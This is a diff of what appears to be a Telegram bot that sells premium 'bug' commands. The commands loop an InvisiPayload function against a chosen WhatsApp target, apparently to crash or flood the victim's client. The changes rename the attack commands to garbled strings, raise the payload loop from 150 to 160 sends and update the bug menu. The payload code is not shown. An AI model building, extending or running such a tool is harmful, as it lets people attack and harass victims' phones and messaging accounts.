@@ -1622,7 +1622,7 @@ bot.command("cd", async (ctx) => {
 });
 
 //
-bot.command("ranz", checkPremium, async (ctx) => {
+bot.command("ranzbug", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1683,7 +1683,7 @@ bot.command("ranz", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 150; i++) {
+        for (let i = 0; i < 160; i++) {
           await InvisiPayload(sock, target);
         }
         successCount++;
@@ -1806,7 +1806,7 @@ bot.command("trashui", checkPremium, async (ctx) => {
     );
   }
 });
-bot.command("bugranz", checkPremium, async (ctx) => {
+bot.command("bughjjbvvranz", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1939,7 +1939,7 @@ bot.use((ctx, next) => {
   // Gunakan middleware
   checkChatType(ctx, next);
 });
-bot.command("ranzv1", checkPremium, async (ctx) => {
+bot.command("ranzvbbb1", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -2031,7 +2031,7 @@ bot.command("ranzv1", checkPremium, async (ctx) => {
     );
   }
 });
-bot.command("ranzbug", async (ctx) => {
+bot.command("ranzbcgggffffffffug", async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -2162,8 +2162,7 @@ async function sendMainMenu(ctx) {
 │ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /bugranz
-│ /ranzv1
+│ /ranzbug
 ╰─────
     `,
     parse_mode: "Markdown",
@@ -2216,8 +2215,7 @@ bot.action("startmenu", async (ctx) => {
 │ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /bugranz
-│ /ranzv1
+│ /ranzbug
 ╰─────
 `;
 
